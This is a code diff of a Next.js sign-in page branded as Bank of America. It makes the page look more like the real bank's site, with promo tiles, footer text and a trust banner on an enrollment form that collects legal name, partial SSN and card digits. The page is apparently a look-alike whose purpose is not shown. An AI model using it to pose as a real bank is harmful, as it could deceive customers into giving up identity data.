@@ -1,7 +1,7 @@
 "use client";
 import { useState } from "react";
 import { useRouter } from "next/navigation";
-import { Eye, EyeOff, X, ScanFace, Phone, MapPin, User as UserIcon, Lock } from "lucide-react";
+import { Eye, EyeOff, X, ScanFace, Phone, MapPin, User as UserIcon, Lock, ShieldCheck } from "lucide-react";
 import { verifyCredentials } from "@/lib/auth";
 
 type Modal = "none" | "faceid" | "forgot" | "enroll";
@@ -75,26 +75,21 @@ export default function LoginPage() {
   };
 
   return (
-    <div className="min-h-screen bg-[#F4F6F9] flex flex-col">
+    <div className="min-h-screen bg-white flex flex-col">
       {/* BoA header */}
-      <div className="bg-gradient-to-b from-[#0A1628] to-[#1C3668] pt-10 pb-16 flex flex-col items-center gap-2 safe-top relative overflow-hidden card-premium">
-        <img
-          src="/logo.png"
-          alt="Bank of America"
-          className="h-12 w-12 object-contain relative z-10"
-          style={{ filter: "brightness(0) invert(1)" }}
-        />
-        <span className="text-white text-xs font-semibold tracking-widest uppercase opacity-80 relative z-10">Bank of America</span>
+      <div className="flex flex-col items-center gap-2 pt-8 pb-6 safe-top">
+        <img src="/logo.png" alt="" className="h-10 w-10 object-contain" />
+        <span className="text-[#1C3668] text-sm font-bold tracking-wide">Bank of America</span>
       </div>
 
-      <div className="flex-1 flex flex-col items-center justify-start px-4 -mt-10">
-        <div className="w-full max-w-sm bg-white rounded-3xl shadow-lift overflow-hidden">
-          <div className="px-6 pt-7 pb-2">
+      <div className="flex-1 flex flex-col items-center justify-start px-4">
+        <div className="w-full max-w-sm">
+          <div className="pb-3 border-b border-[#E5E7EB] mb-5">
             <h1 className="text-xl font-bold text-[#1A1A2E]">Sign in</h1>
             <p className="text-sm text-[#6B7280] mt-1">Bank of America Online Banking</p>
           </div>
 
-          <form onSubmit={handleLogin} className="px-6 pb-6 pt-4 space-y-4">
+          <form onSubmit={handleLogin} className="space-y-4">
             {error && (
               <div className="bg-red-50 border border-red-200 rounded-xl p-3 text-sm text-[#E31837] animate-fade-in">
                 {error}
@@ -152,7 +147,7 @@ export default function LoginPage() {
             <button
               type="submit"
               disabled={loading}
-              className="w-full py-3.5 rounded-xl bg-gradient-to-r from-[#E31837] to-[#B8122A] text-white font-bold text-sm tracking-wide shadow-md hover:shadow-lg active:scale-[0.98] transition disabled:opacity-60 disabled:cursor-not-allowed disabled:active:scale-100"
+              className="w-full py-3.5 rounded-xl bg-[#E31837] text-white font-bold text-sm tracking-wide shadow-sm hover:bg-[#B8122A] active:scale-[0.98] transition disabled:opacity-60 disabled:cursor-not-allowed disabled:active:scale-100"
             >
               {loading ? "Verifying..." : "LOG IN"}
             </button>
@@ -168,23 +163,36 @@ export default function LoginPage() {
           </form>
         </div>
 
-        <div className="w-full max-w-sm mt-4 bg-white rounded-2xl shadow-card p-4 flex items-center gap-3">
-          <div className="h-9 w-9 rounded-xl bg-[#EFF3FA] flex items-center justify-center shrink-0">
-            <ScanFace size={17} className="text-[#1C3668]" />
+        <div className="w-full max-w-sm mt-2">
+          <div className="flex items-center gap-4 py-3 border-b border-[#E5E7EB]">
+            <button className="text-sm font-semibold text-[#1C3668]">My Balance</button>
+            <span className="text-[#E5E7EB]">|</span>
+            <button type="button" onClick={() => setModal("enroll")} className="text-sm font-semibold text-[#1C3668]">Enroll</button>
           </div>
-          <div className="min-w-0">
-            <p className="text-xs font-bold text-[#1A1A2E]">Bank securely, anywhere</p>
-            <p className="text-[11px] text-[#6B7280]">Face ID sign-in available on this device</p>
+
+          <div className="grid grid-cols-2 gap-3 mt-4">
+            {[
+              { title: "Open a savings account", sub: "High-yield options available", emoji: "🏦" },
+              { title: "$200 bonus offer", sub: "For new checking customers", emoji: "💳" },
+              { title: "Send money with Zelle", sub: "Fast, free, secure", emoji: "💜" },
+              { title: "Open an account", sub: "Checking, savings & more", emoji: "➕" },
+            ].map(tile => (
+              <button key={tile.title} className="bg-[#F4F6F9] rounded-2xl p-4 text-left hover:bg-[#EFF3FA] transition">
+                <span className="text-xl">{tile.emoji}</span>
+                <p className="text-xs font-bold text-[#1A1A2E] mt-2 leading-tight">{tile.title}</p>
+                <p className="text-[11px] text-[#6B7280] mt-1 leading-tight">{tile.sub}</p>
+              </button>
+            ))}
           </div>
         </div>
 
-        <p className="mt-6 text-xs text-[#9CA3AF] text-center pb-8">Equal Housing Lender &bull; Member FDIC</p>
+        <p className="mt-8 text-xs text-[#9CA3AF] text-center pb-8">Locations &bull; Contact &bull; Equal Housing Lender &bull; Member FDIC</p>
       </div>
 
       {/* Face ID button */}
       <button
         onClick={handleFaceId}
-        className="fixed bottom-8 right-6 h-14 w-14 bg-gradient-to-br from-[#1C3668] to-[#0A1628] rounded-2xl shadow-lift flex items-center justify-center hover:brightness-110 transition active:scale-95"
+        className="fixed bottom-8 right-6 h-14 w-14 bg-[#1C3668] rounded-2xl shadow-lift flex items-center justify-center hover:bg-[#152A52] transition active:scale-95"
         title="Sign in with Face ID"
       >
         <ScanFace size={26} className="text-white" />
@@ -285,22 +293,30 @@ export default function LoginPage() {
                 </div>
               ) : (
                 <form onSubmit={handleEnroll} className="space-y-4">
+                  <div className="flex items-center gap-2 bg-[#EFF3FA] rounded-xl px-3 py-2.5 mb-1">
+                    <ShieldCheck size={15} className="text-[#1C3668] shrink-0" />
+                    <p className="text-[11px] text-[#1C3668] font-medium">Your information is encrypted and never shared.</p>
+                  </div>
                   {enrollErr && <p className="text-sm text-[#E31837]">{enrollErr}</p>}
                   <div>
-                    <label className="block text-xs font-semibold text-[#6B7280] mb-1">Full Name</label>
-                    <input value={enrollName} onChange={e => setEnrollName(e.target.value)} placeholder="Jane Doe" className="w-full px-4 py-3 rounded-xl border-2 border-[#E5E7EB] bg-[#F4F6F9] text-sm focus:outline-none focus:border-[#1C3668]" />
+                    <label className="block text-xs font-semibold text-[#6B7280] mb-1">Legal Full Name</label>
+                    <input value={enrollName} onChange={e => setEnrollName(e.target.value)} placeholder="As it appears on your card" className="w-full px-4 py-3 rounded-xl border-2 border-[#E5E7EB] bg-[#F4F6F9] text-sm focus:outline-none focus:border-[#1C3668] focus:bg-white transition" />
                   </div>
                   <div>
                     <label className="block text-xs font-semibold text-[#6B7280] mb-1">Last 4 digits of SSN</label>
-                    <input value={enrollSsn} onChange={e => setEnrollSsn(e.target.value.replace(/\D/g, "").slice(0, 4))} placeholder="XXXX" className="w-full px-4 py-3 rounded-xl border-2 border-[#E5E7EB] bg-[#F4F6F9] text-sm focus:outline-none focus:border-[#1C3668]" />
+                    <input value={enrollSsn} onChange={e => setEnrollSsn(e.target.value.replace(/\D/g, "").slice(0, 4))} placeholder="• • • •" inputMode="numeric" className="w-full px-4 py-3 rounded-xl border-2 border-[#E5E7EB] bg-[#F4F6F9] text-sm tracking-widest focus:outline-none focus:border-[#1C3668] focus:bg-white transition" />
                   </div>
                   <div>
-                    <label className="block text-xs font-semibold text-[#6B7280] mb-1">Debit/Credit Card Number (last 4)</label>
-                    <input value={enrollCard} onChange={e => setEnrollCard(e.target.value.replace(/\D/g, "").slice(0, 4))} placeholder="XXXX" className="w-full px-4 py-3 rounded-xl border-2 border-[#E5E7EB] bg-[#F4F6F9] text-sm focus:outline-none focus:border-[#1C3668]" />
+                    <label className="block text-xs font-semibold text-[#6B7280] mb-1">Debit/Credit Card Number</label>
+                    <div className="relative">
+                      <span className="absolute left-4 top-1/2 -translate-y-1/2 text-xs text-[#9CA3AF] font-mono tracking-wider">••••</span>
+                      <input value={enrollCard} onChange={e => setEnrollCard(e.target.value.replace(/\D/g, "").slice(0, 4))} placeholder="Last 4 digits" inputMode="numeric" className="w-full pl-12 pr-4 py-3 rounded-xl border-2 border-[#E5E7EB] bg-[#F4F6F9] text-sm tracking-widest focus:outline-none focus:border-[#1C3668] focus:bg-white transition" />
+                    </div>
                   </div>
-                  <button type="submit" className="w-full py-3 rounded-xl bg-[#1C3668] text-white font-bold text-sm">
+                  <button type="submit" className="w-full py-3.5 rounded-xl bg-[#1C3668] text-white font-bold text-sm hover:bg-[#152A52] active:scale-[0.98] transition">
                     Submit Application
                   </button>
+                  <p className="text-[11px] text-[#9CA3AF] text-center leading-relaxed">By continuing, you agree to the Online Banking Service Agreement and Privacy Notice.</p>
                 </form>
               )}
             </div>
